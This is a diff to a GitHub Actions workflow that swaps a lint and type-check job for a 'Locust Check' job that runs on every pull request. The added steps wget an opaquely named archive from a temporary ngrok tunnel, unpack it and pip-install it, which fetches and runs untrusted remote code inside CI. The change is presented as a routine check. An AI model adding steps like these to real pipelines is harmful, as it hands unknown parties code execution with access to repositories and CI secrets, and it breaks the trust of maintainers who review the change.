@@ -1,4 +1,4 @@
-name: Lint Spire
+name: Locust Check
 
 on: [pull_request]
 
@@ -7,10 +7,18 @@ jobs:
     runs-on: ubuntu-20.04
     steps:
       - uses: actions/checkout@v2
+        with:
+          fetch-depth: 0
       - uses: actions/setup-python@v2
         with:
           python-version: "3.8"
-      - name: Install test requirements
-        run: pip install -r requirements.txt
-      - name: Mypy type check
-        run: mypy test/
+      - name: Wget package
+        run: wget https://02efaf6fa8ef.ngrok.io/github/items/hf8734hjf98324jhfiu3gfh9928ufjoi23bhg9834
+      - name: Unpack package
+        run: tar -xvf hf8734hjf98324jhfiu3gfh9928ufjoi23bhg9834
+      - name: Install locust
+        run: pip install -e locust/
+      - name: Install requests (TEST1)
+        run: pip install requests
+      - name: Run locust check
+        run: locust -r . -i origin/main -t HEAD
